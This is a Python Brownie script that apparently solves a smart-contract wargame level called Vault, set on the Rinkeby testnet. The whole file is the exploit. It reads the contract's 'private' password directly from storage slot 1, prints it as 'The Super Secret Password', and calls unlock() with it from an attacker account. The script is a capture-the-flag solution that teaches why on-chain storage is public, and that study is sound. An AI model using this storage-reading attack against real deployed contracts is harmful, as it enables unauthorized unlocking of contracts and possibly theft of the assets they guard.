#!/usr/bin/python3
from brownie import interface, web3, convert
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0xa2A048C4e28Dd30a18ABDdBC4edD4ED906F21A7A


def vault(contract_address=None, attacker=None):
    if not contract_address:
        token_contract, _ = deploy()
        contract_address = token_contract.address
        _, attacker = get_account()
    else:
        token_contract = interface.Vault(contract_address)

    # ? Both are same
    # print(f"{green}Vault status locked: {red}{token_contract.locked()}{reset}")
    # print(f"{green}Vault status locked: {red}{convert.to_bool(locked)}{reset}")

    locked = web3.eth.get_storage_at(contract_address, 0)
    print(f"{green}Vault is locked -> {red}{convert.to_bool(locked)}{reset}")

    passwd = web3.eth.get_storage_at(contract_address, 1)

    print(f"{red}Found The Super Secret Password......{reset}")
    print(f"{green}Password -> {red}{convert.to_string(passwd)}{reset}")

    #   exit(1)
    # * no need to encode as this is already a hexbytes string
    unlock_tx = token_contract.unlock(passwd, {"from": attacker})
    unlock_tx.wait(1)

    print(f"{green}Vault is locked-> {red}{token_contract.locked()}{reset}")


def main(contract_address=None):
    if contract_address:
        vault(contract_address, get_account())
    else:
        vault()


if __name__ == "__main__":
    main()
